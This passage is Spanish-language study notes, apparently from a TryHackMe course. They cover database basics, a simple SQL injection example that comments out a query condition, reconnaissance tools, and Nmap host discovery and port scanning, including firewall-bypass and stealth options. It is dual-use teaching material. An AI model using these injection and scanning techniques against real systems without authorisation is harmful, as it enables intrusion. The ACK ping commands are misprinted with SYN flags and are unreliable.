		<img src="{{ 'assets/img/THM/Pasted image 20220902205034.png' | relative_url }}" text-align="center"/>
	</div>
	
- De esta forma, la combinación entre un registro y un campo en una tabla nos proporciona el *atributo* (valor) de un elemento concreto.
   
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902205058.png' | relative_url }}" text-align="center"/>
	</div>

	<br />
	
- De forma que el número de filas nos dice el número total de elementos que tenemos en la tabla y el número de campos nos dice el número de datos distintos que tenemos para un elemento particular genérico de la tabla. 

Así pues podemos asumir las siguientes conclusiones:

**Un CAMPO es la unidad mínima de información que se gestiona en una base de datos**.

**El valor que un campo toma para un elemento concreto se denomina ATRIBUTO**

**Un conjunto de atributos referentes al mismo elemento conforma un REGISTRO**.

**Un conjunto de registros de distintos elementos termina conformando una TABLA**.

**Varias tablas pueden llegar a conformar una BASE DE DATOS**

**Varias bases de datos están gestionadas por un SGBD**

  

Además de los elementos fundamentales campo, registro, tabla, podemos encontrar los siguientes elementos:

-   **Índice**: Él indice es un identificador único de cada registro que permite un rápido acceso a los mismos y mejora la velocidad de las operaciones entre los mismos.
    
-   **Clave Primaria**: La calve primaria se trata de **un campo o un conjunto de ellos que permite identificar de forma inequívoca a un registro de la tabla**; se trata, para cada elemento de la tabla, de un atributo único, no nulo.
    
    Del ejemplo anterior se puede deducir que nuestra clave primaria de la tabla es el campo DNI; se trata del único campo que no puede ser nulo y que no puede estar repetido para ningún registro pues no existen dos personas con el mismo DNI.
    
-   **Clave Ajena**: Se trata de un mecanismo referencial entre dos tablas que tiene por finalidad evitar la redundancia de información en la misma base de datos.

	<br />

**What is SQL?**

Teniendo claro las partes que componen una base de datos, podemos entender mejor cómo funciona el SQL: https://www.w3schools.com/sql/default.asp

<br />

**What is SQL Injection**

De esta forma, el SQL Injection se produce cuando una aplicación web contiene una funcionalidad que incrusta input del usuario sin sanear en una query SQL permitiéndo así que se inyecten instrucciones SQL sobre el SGBD. 

Por ejemplo, un parámetro de la URL:

```defaul
https://website.thm/blog?id=1
```

Este parámetro "id" se incrusta en una sentencia SQL del tipo:

```SQL
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

De manera que un usuario podría introducir:

```defaul
https://website.thm/blog?id=2;--
```

El punto y coma pone final a la sentencia y los dos guiones indican el inicio de un comentario con lo que se omite efectivamente el código que va después del parámetro:

```SQL
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

Y la sentencia que se introduce en el SGBD está sesgada y mostrará el item 2 idependientemente de si este es público o no.

<br />

más información en: https://qv1ntv5.github.io/2022-03-06-1.SQLInjection/

<br />

### 4. Network Security. 

#### 4.1. Passive Reconnaissance.

**Passive Versus Active Recon**

El Reconnaissance se define como la etapa en la que se realiza una recopilación de información sobre el objetivo a atacar, es el priemr paso de la [Unified Kill Chain](https://www.unifiedkillchain.com/):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220818133252.png' | relative_url }}" text-align="center"/>
</div>

Lo dividimos entre Reconocimiento Pasivo y Reconocimiento Activo, 

En el Reconocimiento Pasivo sólo se obtiene información de fuentes públicas, es lo que se denomina como OSINT. Esto incluye:

- Registros DNS en servidores DNS públicos.
- Información expuesta públicamente por el objetivo, (revistas, anuncios, entrevistas, etc).
- Información pública expuesta por terceros. 

Por otra parte el Reconocimiento Activo involucra un "engagement" o contacto directo con el objetivo y en general no es un proceso tan discreto. Esto incluye:

- Información obtenida de la conexión con servidores de la compañia. HTTP, FTP, SMTP, etc.
- LLamadas a la compañia para obtener información. 
- Visitas a la propia compañia. 

	<br />

**Whois**

*Whois* es un protocolo de respuesta y peticiones que sigue las especificaciones [RFC 3912](https://www.ietf.org/rfc/rfc3912.txt). 

El mecanismo consiste en que una máquina tiene el puerto 43/tcp escuchando peticiones y el registrador de dominios es responsable de mantener los registros de WHOIS para los nombres de dominio que arrienda. El servidor de WHOIS responde con diversa información relacionada con el dominio solicitado, entre la que podemos encontrar:

- *Registrar*: El nombre dominio registrado. 
- *Contact info*: Nombre, Organización, teléfono, entre otras cosas.
- *Creation, Update y Expiration dates*.
- *Nombre del Servidor*.

Para obtener esta inforamación necesitamos tener instalado un cliente "whois" instalado o un servicio online:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220818173052.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Nslookup and Dig**

Otros servicios que podemos emplear en la recopilación de información son *Nslookup* y *Dig*.

- *Nslookup*: Es el acrónimo de Name Server Look Up y se trata de un servicio que se utiliza como herramienta de línea de comandos: 

	```bash
	nslookup <OPTIONS> <DOMAIN_NAME> <SERVER-IP>
	```

	Y que en función de las opciones especificadas proporciona información del servidor asociado al dominio y la IP proporcionados:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220818180704.png' | relative_url }}" text-align="center"/>
	</div>

	Por ejemplo: 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220818180808.png' | relative_url }}" text-align="center"/>
	</div>
	
	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220818180950.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *Dig*: Por otra parte tenemos el Domain Information Groper, abreviado bajo las siglas DIG, el cual realiza el mismo trabajo que Nslookup pero de una manera más extensa. Funciona de manera parecida a Nslookup:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220819111856.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

#### 4.2. Active Reconnaisance. 

**Intro**

El Reconocimiento Activo consiste en la recopilación de información mediante el uso de herramientas que entran en contacto directo con el objetivo. Estas herramientas son: *web browser, ping, traceroute, telnet y nc*.

<br />

**Web Browser**

El Navegador Web de una máquina se puede entender como una herramienta que nos permite ponernos en contacto con los servicios HTTP que el servidor puede ofrecer generalmente en los puertos 80, 8080 y 443. 

- Como estos, preferentemente el 80 y 443, son los puertos por defecto, no se necesita añadir estos en la URL para indicar al navegador sobre qué puertos dirigir la request pero eso no significa que no podamos emplear el buscador web para interactuar con otros puertos:

	```URL
	https://<IP>:<PORT>/
	```

	Así por ejemplo. https://127.0.0.1:8080 te conecta a tu propia máquina al puerto 8080.


- Recordemos que como herramienta embebida en el navegador tenemos DevTools que podemos abrir con Ctrl+Shift+I en firefox y en comandos similares en otros navegadores. 

- Por último, tenemos un montón de herramientas que podemos instalar en el navegador como: FoxyProxy, Wappalyzer, DOMInvader, etc. 

	<br />

**Ping**

Ping es una herramienta de comandos cuyo principal propósito es comprobar la conexión de red, es decir, comprobar si tu máquina local puede llegar a un sistema remoto y si el sistema remoto puede alcanzarte de vuelta.

En términos técnicos, el comando *ping* envía un paquete ICMP Echo a un sistema remoto y, si este se encuentra disponible (y no está apagado o bloqueado por un firewall...), responderá de la misma forma:

```bash
ping <OPTIONS> <SERVER-IP>
```

Por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220820094840.png' | relative_url }}" text-align="center"/>
</div>

En el ejemplo anterior instruimos al comando Ping a mandar 5 paquetes. El output que recibimos es indicio de que los paquetes llegan de vuelta y de que por tanto el host está activo y disponible, además también tenemos un tiempo de respuesta aproximado que nos puede servir para orientarnos respecto de la calidad de la conexión. 

Si el host estuviera no disponible hubiéramos obtenido el siguiente output:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220820100005.png' | relative_url }}" text-align="center"/>
</div>

Para este último caso, existen las siguientes posibilidades:

- El host remoto está apagado. 
- Está encendido pero desconectado de la red o la misma está defectuosa (un dispositivo intermedio no consigue enrutar correctametne el paquete). 
- Está protegido por un *firewall*.
- Tu máquina está desconectada de la red. 

Una característica importante es que las máquinas Windows poseen un firewall interno que por defecto bloquean los paquetes ICMP. 

<br />

**Traceroute**

El comando *traceroute* es una extensión del concepto implementado en el comando ping que permite listar todos los dispositivos por los que pasa un paquete enviado de una máquina a otra, concretamente, devuelve las direcciones IP de los routers (un *router* es un dispositivo que "enruta", es decir, que pone un paquete en la dirección correcta para que llegue a su destino) que atraviesa un paquete en su travesía por la red. 

En términos prácticos se puede decir que *Traceroute* traza la ruta que sigue un paquete pero es importante mencionar que esta no es fija; puede cambiar debido a diversos protocolos de enrutamiento dinámico presente en algunos dispositivos de enrutamiento.

El comando se encuentra en la mayoría de sistemas operativos:

| OS | Command |
| - | - |
| Linux/macOS | traceroute |
| Windows | tracert |

De forma que la sintaxis de llamada suele ser la misma:

```bash
traceroute/tracert <ServerIP>
```

Ahora, vamos a entender el mecanismo por el que traceroute consigue trazar la ruta que sigue un paquete en términos de dispositivos. No existe una forma directa de descubrir la ruta de un paquete, lo que se hace es emplear el protocolo ICMP para engañar a los routers y provocar que estos muestren su dirección IP. 

Esto se consigue mediante el TTL (Time To Live), este es un campo de la cabecera IP del paquete y mide el número de routers que el paquete puede atravesar antes de ser devuelto al emisor del mismo, se utiliza como medida de prevención de posibles bucles o fallos de red.

De esta forma, cada vez que el paquete cruza un router, este lo redirige modificando este campo restándole en uno su valor:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220821144204.png' | relative_url }}" text-align="center"/>
</div>

Si el TTL llega a cero, el router descarta el paquete y lo envía devuelta al emisor con un error "exceeded in-transit error message":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220821160556.png' | relative_url }}" text-align="center"/>
</div>

Observemos que cuando un dispositivo (routers incluidos) envía un paquete, plasma su IP en el paquete como la IP del emisor, según el modelo OSI.

*Así, traceroute envía sucesivos paquetes con el campo TTL igual primero a 0, luego 1, 2, 3, etc. Así, los routers que se van topando con los distintos paquetes con TTL 0 devuelven el paquete plasmando su dirección IP en la cabecera IP del mismo te revelando así su identidad para el ejecutor del comando.*

Este los lista y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220821161503.png' | relative_url }}" text-align="center"/>
</div>

El output de traceroute muestra la IP del router emisor seguido del tiempo que ha tardado el paquete en volver en milisegundos. Observemos que el output es una lista de los "hops", pero en cada línea aparece más de una IP, esto es debido a que no se lanza un único paquete, se lanzan varios con el mismo valor TTL y estos con frecuencia son recogidos por distintos routers (tal y como comentábamos al principio existen protocolos de enrutamiento dinámico que dificultan el trazado de la ruta que sigue el paquete) cuyas IPs se plasman a la misma altura del mapeo de la ruta.

Por otra parte, algunos routers no devuelven un paquete ICMP, esto se refleja en el output mediante un asterísco:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220821170803.png' | relative_url }}" text-align="center"/>
</div>

Esto significa que no se ha hallado vuelta sobre un paquete ICMP mandado. 

<br />

**Telnet**

Como ya sabemos de partes anteriores. TELNET es el acrónimo de TELetype NETwork y se trata de un protocolo diseñado para la comunicación entre sistemas vía CLI (command-line interface). 

Por otra parte, el comando *Telnet* emplea el protocolo TELNET para ofrecer el servicio TELNET que entre otras cosas permite administración remota, descarga de ficheros, etc no cifrado (un servicio análogo pero cifrado y preferible sería SSH). El puerto definido para telnet es el 23/tcp.

Sin embargo, para propósitos simples Telnet como comando sigue sien útil para obtener un primer acercamiento sobre otro servicio y los recursos que emplea para mantenerse online: IP del servidor, versión del servicio, etc. 

Un ejemplo práctico sería conectarse con telnet al puerto 80 de una máquina y obtener las cabeceras que el servidor incluye en su respuesta HTTP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220821173749.png' | relative_url }}" text-align="center"/>
</div>

Observemos que incluye la cabecera server que nos da el servidor web y su versión. 

<br />

**Netcat**

Netcat es una utilidad para los sistemas basados en UNIX escrita en C que coge su nombre de NETworking conCATenating data to a file. Se puede entender como una herramienta para realizar distintas tareas a lo largo de una red como:

- Administración remota.
- Subida/descarga de ficheros.
- Actuar como cliente que se conecta a distintos tipos de servidores.
- Actuar como servidor que escucha peticiones entrantes en un puertos (entre las que se incluyen compartir el output de un programa que se ejecuta en la máquina remota o local como una reverse shell). 

Se la considera algo así como la "navaja suiza" de las operaciones de networking. 

<br />

#### 4.3. Nmap Live Host Discovery.

**Intro**

Este es uno de los cuatro capítulos dedicados al desarrollo de un conocimiento profundo del uso de la herramienta Nmap. Recordamos que esta es una herramienta de reconocimiento, especializada en el descubrimiento de sistemas y escaneo de puertos. 

En cierto sentido, los apartados a seguir son:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220822105400.png' | relative_url }}" text-align="center"/>
</div>

La parte de enumeración de objetivos está resuelta con el Passive Reconnaisance.

<br />

**Subnetworks**

Vamos a definir una serie de conceptos previos:

- *Segmento de red*: Un segmento de red es, en términos simples, una porción de una Network, concretamente; es un conjunto de máquinas conectadas al mismo medio de difusión, como un switch.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220822135850.png' | relative_url }}" text-align="center"/>
</div>
	
- *Subred*: Una subred consiste en uno o varios segmentos de red conectados entre sí y configurados para utilizar el mismo router. Esto tiene obviamente una trascendencia en lo relativo a las IPs ya que todas ellas emplean el mismo router. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220822135514.png' | relative_url }}" text-align="center"/>
</div>
	
Observemos que entonces, un segmento de red es una distinción física o material, mientras que una subred es una distinción lógica. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220822135940.png' | relative_url }}" text-align="center"/>
</div>

Así por ejemplo en el diagrama anterior se pueden observar cuatro segmentos de red que serían cuatro grupos de dispositivos conectados al mismo swtich y estos a su vez se conectan al mismo router, obteniéndose así la subred.

En términos prácticos, un dispositivo formaría parte de uno de estos segmentos involucrado en una subred (con su propia IP de red o dicho de otra forma, con su propio rango de IPs) que a su vez está conectado a una red más extensa mediante un punto de acceso que con frecuencia es un router. 

Por último, uno de los protocolos que cobran más importancia en lo relativo a las subredes es el protocolo ARP (Address Resolution Protocol). Este es un protocolo que se encarga de asociar una IP con una MAC, la MAC a su vez es necesaria para identificar físicamente (no en términos de IP) a la máquina a la cual se va a enviar un mensaje. Es decir, el protocolo ARP identifica los dispositivos dentro de una subred o red local.

<br />

**Enumerating Targets**

Podemos emplear Nmap para realizar una enumeración de dispositivos activos dentro de una red. Para ello debemos incluir una referencia sobre los dispositivos que estamos buscando, por ejemplo:

- *Secuencia de IPs*: 10.11.12.15, 10.11.12.16, ...10.11.12.20.
- *Rango de IPs*: 10.11.12.15 - 20. El guión puede introducirse en cualquiera de los octetos.
- *Máscara de subred*: 10.11.12.15/24 -> Esto escaneará todas las IPs variando el valor del último octeto, desde 0 hasta 254.
- *Lista de nombres*: nmap -iL list_of_hosts.txt

Para obtener una lista de los hosts que Nmap va a escanear podemos emplear el comando: nmap -sL TARGETS.

<br />

**Discovering Live Hosts**

Cuando ya hemos terminado la etapa de enumeración de dispositivos en una red, nos toca realizar un *Host Discovery* para saber cuáles de ellos están activos previo al *port scanning*. Evidentemente es un gran gasto de tiempo escanear puertos de dispostivos inactivos. 

Nmap, a la hora de descubrir Hosts activos en una red, lleva a cabo la difusión de un paquete de información al que la máquina reacciona de una forma concreta en función de su estado. Dicha reacción es empleada por Nmap para obtener conclusiones sobre la máquina.

Las máquinas reaccionan de forma distinta en función del tipo paquete que se envíe que se corresponde a su vez con el protocolo que se utilice para enviar dicho paquete. Distinguimos entre los siguientes protocolos:

- *ARP from Link Layer (Capa 2)*: Asocia la MAC de una máquina con su IP, ofrece un servicio de identificación física de la misma.
- *ICMP from Network Layer (Capa 3)*: Cuestiones de mantenimiento.
- *TCP from Transport Layer (Capa 4)*: Transmisión segura de la información.
- *UDP from Transport Layer (Capa 4)*: Transmisión rápida de la información.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220822225648.png' | relative_url }}" text-align="center"/>
</div>

En base a cada tipo de paquete se realiza un "tipo de escaneo" que será en lo que nos centremos más adelante. 

Por defecto, con Nmap existen diversos procedimientos en función de si nos encontramos dentro o fuera de la LAN y si tenemos o no privilegios suficientes:

- *ARP Scanning*: Si un usuario con privilegios (root o cualquier usuario que pueda emplear sudo) escanea una LAN (red local) emplea paquetes ARP, concretamente: ARP Broadcast Requests. 

- *ICMP Scanning*: Si un usuario privilegiado escanea dispositivos fuera de la LAN emplea paquetes ICMP, concretamente: ICMP Echo Requests. 

	Aunque también puede emplear paquetes TCP ACK request al puerto 80/tcp, TCP SYN al puerto 443 y ICMP timestamp requests. 

- *TCP 3-way scanning*: Cuando un usuario sin privilegios realiza un escaneo fuera de la red local emplea un TCP 3-way handshaking a los puertos 80 y 443. 

Cuando directamente se pasa a la fase de escaneo de puertos sin realizar un Discovery Host, Nmap envía antes de nada un Ping request y seguidamente procede al escaneo de puertos, sin embargo, esto no es tan eficiente como otras opciones más concretas. 

<br />

**Nmap Host Discover Using ARP (ARP Scanning)**

El escaneo ARP es el escaneo que se produce mediante la difusión por parte de Nmap de ARP broadcast requests, *el escaneo ARP sólo es posible si la máquina ejecutante se encuentra dentro de la misma subred que los sistemas a escanear*. 

Antes de continuar recordamos el protocolo ARP se emplea para asociar la IP de un dispositivo remoto con su MAC para hacer la comunicación enter ambos dispositivos viable. Así, un dispositivo que desea ponerse en contacto con otra máquina busca en el "ARP cache" la MAC asociada a la IP dada. Si no la encuentra procede al envío de un ARP Broadcast Request al router que haría llegar la solicitud al resto de máquinas para identificar a la que posee la IP y obtener su MAC. 

De esta forma, Nmap, al realizar un ARP scan, envía una secuencia de ARP Broadcast Requests correspondiente al rango de IPs que se desean comprobar: 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823143853.png' | relative_url }}" text-align="center"/>
</div>

y marca como máquinas activas aquellas correspondientes a las IPs que devuelven un ARP reply. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823143904.png' | relative_url }}" text-align="center"/>
</div>

Para hacer sólo un escaneo ARP empleamos el comando: 

```bash
nmap -PR -sn <TARGETS>
```

- *-PR*: ARP scan.
- *-sn*: No proceder con un consecuente escaneo de puertos. 


El flag -PR indica que sólo quieres que se realice un escaneo ARP. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823143804.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Nmap Host Discovery Using ICMP**

El ICMP Host Discovery Scan se basa en enviar un paquete *ICMP Type8/Echo* (ping request) a cualquier dirección IP dentro de un rango de direcciones y catalogar como activas aquellas direcciones que respondan con un *ICMP Type 0* (ping reply).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823174136.png' | relative_url }}" text-align="center"/>
</div>

<br />

```bash
nmap -PE -sn <TARGETS>
```

- *-PE*: ICMP scan.
- *-sn*: No proceder con un consecuente escaneo de puertos. 

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823173536.png' | relative_url }}" text-align="center"/>
</div>

El output tendría la forma:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823174024.png' | relative_url }}" text-align="center"/>
</div>

Conviene saber que Nmap convina los resultados con la información que tiene de escaneos previos. Si hubiéramos escaneado la red con un escaneo ARP anteriormente, hubiéramos obtenido además, las MACs:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823174111.png' | relative_url }}" text-align="center"/>
</div>

Sobre este escaneo existen diversas variantes:

- *-PP*: Con esta opción cambiamos el tipo de paquete que enviamos ICMP Type 13/14 (ICMP Timestamp request/reply).

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823180540.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823180554.png' | relative_url }}" text-align="center"/>
	</div>

- *-PM*: Con esta opción cambiamos el tipo de paquete a "ICMP Type 17/18" (Address Mask Request/Reply). 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823182136.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823182213.png' | relative_url }}" text-align="center"/>
	</div>

Ambos métodos anteriores nos pueden servir para bypasear algunos tipos de bloqueos. 

<br />

**Nmap Host Discovery Using TCP and UDP**

Recordamos que Nmap es una herramienta que envía paquetes y en función de la reacción saca conclusiones acerca de la máquina. En este caso vamos a concentrarnos en los múltiples escaneos que se hacen sobre los protocolos TCP y UDP: 

- *TCP SYN Ping*: Este escaneo se basa en el protocolo de acción *3-Way TCP handshaking* según el cual, la máquina de destino debe contestar a un SYN con un SYN/ACK si el puerto está abierto y un RST si está cerrado.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823213842.png' | relative_url }}" text-align="center"/>
	</div>

	De esta forma, Nmap envía un SYN al puerto 80/tcp y marca como activa la máquina si recibe un SYN/ACK (o un RST) y devuelve un RST (en el caso del SYN/ACK) para indicar la terminación de la conexión y no bloquear el puerto:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823214227.png' | relative_url }}" text-align="center"/>
	</div>

	Recordamos que en este caso estamos descubriendo hosts activos en una red y por tanto, en primer lugar, el estado del puerto no importa y, en segundo lugar, basta con hacerlo con un puerto que nos de la respuesta que deseamos. Por defecto, el escaneo se lanza sobre el puerto 80 pero se puede elegir el puerto sobre el que se lanza el TCP Ping indicandolo después del modificador:

	```bash
	nmap -PS21 -sn <TARGET>
	nmap -PS21-25 -sn <TARGET>
	nmap -PS21,80,443 -sn <TARGET>
	```

	El primer comando enviará el comando específicamente sobre el puerto 21, el segundo lo hará con los puertos 21, 22, 23, 24 y 25 y el tercero con el 21, 80 y 443. 

	El output quedaría como:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823215522.png' | relative_url }}" text-align="center"/>
	</div>

	Y si puediéramos ver el tráfico con una herramienta de intercepción del mismo obtendríamos:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823220327.png' | relative_url }}" text-align="center"/>
	</div>

	Observamos que se envían en batería una serie de paquetes SYN al puerto 80 de una serie IPs.
	
	<br />

- *TCP ACK Ping*: *Es necesario recordar que este escaneo necesita ser ejecutado por un usuario con privilegios (root)*.

	En este caso, Nmap se basa en que, por convenio, cualquier máquina que reciba un paquete ACK aislado debe devolver un RST independientemente de si el puerto está abierto o cerrado (lo cual ahora nos importa poco) y eso significa que el host está activo. 

	Empleamos el flag *-PA* para ejecutar dicho escaneo:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823222644.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823223138.png' | relative_url }}" text-align="center"/>
	</div>
	
	Esto puede servir para bypassear un firewall que esté actúando con lista blanca para bloquear cualquier SYN, pero no bloquee ningún ACK porque no está configurado para ello. 

	Siguiendo el mismo principio que en los casos anteriores tenemos que el puerto por defecto sobre el que se envía el ACK es el 80, pero esto puede definirse después del flag -PA como hemos hecho con el escaneo anterior:

	```bash
	nmap -PS21 -sn <TARGET>
	nmap -PS21-25 -sn <TARGET>
	nmap -PS21,80,443 -sn <TARGET>
	```

	<br />

- *UDP Ping*: Este tipo de escaneo emplea el protocolo UDP que recordemos que UDP es un protocolo orientado a la rapidez de la información y no a la integridad de la misma. 

	Una máquina tiene establecido para un puerto UDP cerrado devolver un paquete ICMP Type 3 y nada si está abierto:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823224927.png' | relative_url }}" text-align="center"/>
	</div>
	
	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220823224943.png' | relative_url }}" text-align="center"/>
	</div>

	Así, Nmap cataloga una máquina como activa y encuentra un puerto cerrado que le devuelve una respuesta. 

	<br />

**CheatSheet**

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823231422.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220823231446.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.4. Nmap Basic Port Scans.

**Intro**

Rememorando los visto hasta ahora, hemos visto que los pasos a la hora de examinar un objetivo consiste en: Enumeración; visto en Passive Reconnaisance, Discover live host y Reverse-DNS lookup visto en el apartado anterior donde teníamos múltiples opciones de escaneo de máquinas.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220824145846.png' | relative_url }}" text-align="center"/>
</div>

Ahora, en el supuesto de que hayamos recopilado información acerca del objetivo y hayamos rastreado dispositivos activos en la subred, es hora de escanear los servicios que dichos dispositivos activos exponen.

Esta es una tarea que tambíen podemos realizar con Nmap mediante:

- *TCP connect port scan*.
- *TCP SYN port scan*.
- *UDP port scan*.

	<br />

**TCP and UDP Ports**

En el mismo sentido en el que una IP identifica un host en una red, los puertos TCP/UDP identifican un servicio de red que se ejecuta en dicho host.  

Por otra parte, un servicio de red se gestiona mediante un servidor (un programa) que "escucha" (atiende peticiones) en un puerto y está asociado a un protocolo de red a través del cual se transmite la información. Por ejemplo:

| Port | Protocol | Service |
| - | - | - |
| 80/tcp | HTTP | Web Service |
| 443/tcp | HTTPS | Web Service |
| 21/tcp | FTP | Data File transmision |
| 22/tcp | SSH | Remote Administration  |
| 53/udp | DNS | Domain Name Service |
Estos son puertos por defecto que pueden cambiarse aplicando la configuración deseada. 

Así, un cliente que desee acceder a un servicio que ofrece un servidor remoto debe hacerlo a través de un protocolo específico refiriéndose a un puerto concreto. 

En esta sección nos concentraremos en los distintos estados en los que un cliente que examina un puerto en el que supuestamente opera un servidor puede tener. En términos reales, distinguimos dos posibilidades:

- *Open port*: Hay una aplicación/programa/servidor escuchándo detrás del puerto y por tanto, este está receptivo a escuchar peticiones de clientes. 

- *Closed port*: No hay tal aplicación escuchándo y por tanto el puerto rechaza todas las peticiones que recibe. 

Sin embargo, Nmap ofrece 6 estados distintos en función de las conclusiones que le permite obtener sus escaneos: 

- *Open*: Hay un servidor escuchando en el puerto. 
- *Closed*: No hay un servidor escuchando en el puerto. 
- *Filtered*: Nmap no puede determinar si el puerto está abierto o cerrado porque no es accesible. Esto suele ocurrir cuando existe un firewall que filtra las peticiones entrantes y de ahí el nombre. 
- *Unfiltered*: No se pudo determinar si el puerto está abierto/cerrado  pero el puerto si es accesible. Este estado es exclusivo del escaneo TCP ACK (-sA). *Recordemos que un puerto, que esté abierto o cerrado, debe devolver un RST si recibe un ACK aislado, de ahí la imposibilidad de llevar a cabo una distinción*. 
- *Open/Closed|Filtered*: No se puede determinar si el puerto está abierto/cerrado o es inalcanzable. Esto es clásico de escaneos (como el UDP o el TCP NULL Scan) en el que Nmap no espera recibir una respuesta por parte del puerto si este está abierto/cerrado y por tanto no puede discernir si el puerto es inalcanzable o si está abierto o cerrado.

	<br />

**TCP Connect Scan**

El TCP Connect Scan se basa en completar con un puerto el TCP 3-way handshaking y seguidamente la conexión se interrumpe tan pronto como se confirma su estado mediante el envío de un RST/ACK.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220824211434.png' | relative_url }}" text-align="center"/>
</div>

*Este es el único tipo de escaneo posible si no se es un usuario con privilegios*.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220824212034.png' | relative_url }}" text-align="center"/>
</div>

Por defecto se escanean los 1000 puertos más comunes en orden, pero podemos emplear junto al comando el modificador -F para escanear en lugar de los 1000, los 100 puertos más comunes y el -r para que el orden de escaneo sea aleatorio. 

De esta forma, Nmap cataloga como abiertos aquellos puertos con los que completa un 3-Way Handshaking y como cerrados al resto.

<br />

**TCP SYN Scan**

Este tipo de escaneo es similar al anterior, pero cierra abruptamente la conexión sin terminar el 3-way handshaking:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220824220011.png' | relative_url }}" text-align="center"/>
</div>

Esto tiene como efecto fundamentalmente reducir las probabilidades de que se detecte el escaneo y que este se lleve a cabo más rápido. Si pudiéramos comparar ambos escaneos con Wireshark obtendríamos: 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220824221212.png' | relative_url }}" text-align="center"/>
</div>

Esto es, que en el TCP Connect se cierra el Handshake y en el TCP SYN.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220824222550.png' | relative_url }}" text-align="center"/>
</div>

<br />

**UDP Scan**

El escaneo UDP emplea el protocolo UDP que es "connectionless", prioriza por tanto la rapidez a la integridad de la información. 

Los puertos UDP tiene estandarizado responder con un ICMP Type 3, Code 3 (Port Unreachable) cuando el puerto está cerrado y nada cuando está abierto:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220825001732.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220825001739.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220825001755.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, el output podría ser:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220825001832.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Fine-Tuning Scope and Performance**

Algunos atajos que podemos hacer cuando construimos un comando con Nmap son:

- *port list*: -p22,80,443 escanearan puertos 22, 80 and 443.
- *port range*: -p1-1023 escaneará desde el 1 puerto al puerto 1023.
- *T\[0-5\]*: Velocidad del escaneo, 0 más lento, 5 más rápido. El más lento llama menos la atención. 
- *--min/max-parallelism \<numprobes\>*: Otra forma de controlar la velocidad es definir el mínimi/máximo número de paquetes que se envían a la vez. 
- *--min/max-rate \<number>*: En lugar de controlar el paralelismo controla el número de paquetes por segundo. 

	<br />

**CheatSheet**

<div style="text-align:center">
